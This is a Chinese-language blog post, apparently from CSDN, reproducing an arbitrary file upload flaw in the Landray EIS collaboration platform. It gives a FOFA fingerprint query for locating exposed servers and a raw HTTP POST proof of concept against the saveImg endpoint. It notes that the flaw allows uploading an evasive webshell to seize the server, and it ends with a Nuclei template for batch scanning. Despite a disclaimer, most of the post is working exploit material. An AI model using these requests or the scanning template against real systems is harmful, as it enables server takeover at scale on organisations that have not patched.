# 原创
：  漏洞复现--蓝凌EIS智慧协同平台任意文件上传

# 漏洞复现--蓝凌EIS智慧协同平台任意文件上传

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

蓝凌EIS是蓝凌18年中大客户办公应用与阿里钉钉相融合的一款功能全、体验好、开通即用、配置灵活、软硬一体的租赁版OA系统。该系统saveImg存在任意文件上传。

### 二：漏洞影响版本

未知

### 三：网络空间测绘查询

fofa:<br/> `icon_hash="953405444"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2f6e82efcde629b2fd8b30e72df769a2.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4c69d57de538b0fdcfbb4bf6dae8d880.jpeg"/><br/> POC:

```
POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Host: IP:PORT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Length: 197
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu

------WebKitFormBoundaryxdgaqmqu
Content-Disposition: form-data; name="file"filename="hello.txt"
Content-Type: text/html

hellohello
------WebKitFormBoundaryxdgaqmqu--

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4e1b1a5cda8286d878bfd86ca27587a4.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e650b6a2416b672718cb764bb80f348a.jpeg"/>

### 五：漏洞利用

可更改后缀上传免杀脚本木马获取服务器权限<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/53f4f7250aa9fd97e6d0f7ba0ea67174.jpeg"/>

### 六：批量检测

```
id: landray-eis-saveimg-fileupload

info:
  name: 蓝凌eis智慧协同平台任意文件上传
  author: fgz
  severity: critical
  tags: landray,fileupload
  description: |
    蓝凌eis智慧协同平台是由深圳市微达软件有限公司开发的用于企业在知识，协同，项目管理等场景的OA系统。其存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。
  metadata:
    max-request: 3
    fofa-query: icon_hash="953405444"
    hunter-query:
    verified: true

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
  file_content: "{{to_lower(rand_text_alpha(26))}}"

http:
  - raw:
      - |
        POST /eis/service/api.aspx?action=saveImg HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu

        ------WebKitFormBoundaryxdgaqmqu
        Content-Disposition: form-data; name="file"filename="{{file_name}}"
        Content-Type: text/html
        
        {{file_content}}
        ------WebKitFormBoundaryxdgaqmqu--
          
      - |
        GET {{file_name2}} HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    extractors:
      - type: kval
        name: file_name2
        internal: true
        kval:
          - body
    matchers:
      - type: word
        words:
          - "{{file_content}}"
        part: body

```
